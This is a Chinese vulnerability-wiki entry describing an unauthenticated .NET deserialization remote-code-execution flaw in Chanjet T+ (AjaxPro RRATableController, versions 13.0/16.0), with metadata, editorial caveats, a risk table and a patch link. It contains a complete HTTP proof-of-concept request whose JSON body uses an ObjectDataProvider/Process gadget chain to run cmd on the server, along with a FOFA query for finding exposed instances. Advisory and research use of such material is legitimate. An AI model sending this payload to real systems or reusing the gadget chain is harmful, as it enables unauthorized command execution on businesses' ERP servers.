---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "畅捷通T+ AjaxPro RRATableController反序列化"
product: "畅捷通T+ AjaxPro"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "13.0/16.0；WPF ObjectDataProvider依赖"
prerequisites: "声明匿名"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9A/%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20Ufida.T.DI.UIP.RRA.RRATableController%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"畅捷通-TPlus\""
id: "vw-a0873085e3dd41a54461f507"
entity_id: "ve-a0873085e3dd41a54461f507"
schema_version: "1"
---

# 畅捷通T+ AjaxPro RRATableController反序列化

## 条目说明

- 对象与具体问题：畅捷通T+ AjaxPro；RRATableController反序列化
- 版本、配置及部署条件：13.0/16.0；WPF ObjectDataProvider依赖
- 认证与权限前提：声明匿名
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- GET含JSON正文无Content-Type/Length，工具发送条件缺失
- cmd /c pwd为Windows命令兼容问题，生成文件不自动证明预期回显
- 保留16.000.000.0283补丁线索但13版补丁缺失；与_PriorityLevel为相关不同入口

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

畅捷通 T+ /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx接口存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。

## 影响范围

畅捷通 T+ 13.0 畅捷通 T+ 16.0

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="畅捷通-TPlus"

POC/EXP：

```http
GET /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 127.0.0.1:8888
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c pwd > haha.txt"
       }
    }
  }
}
```


![image-20240315131720619](./.resource/畅捷通T+Ufida.T.DI.UIP.RRA.RRATableController反序列化RCE漏洞/media/image-20240315131720619.png)


![image-20240315131734046](./.resource/畅捷通T+Ufida.T.DI.UIP.RRA.RRATableController反序列化RCE漏洞/media/image-20240315131734046.png)


## 修复方案

**官方修复：**

目前官方已发布补丁更新，建议受影响用户尽快安装。

T+ 16.000.000.0283 及以上补丁包：

https://www.chanjetvip.com/product/goods/detail?id=6077e91b70fa071069139f62


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
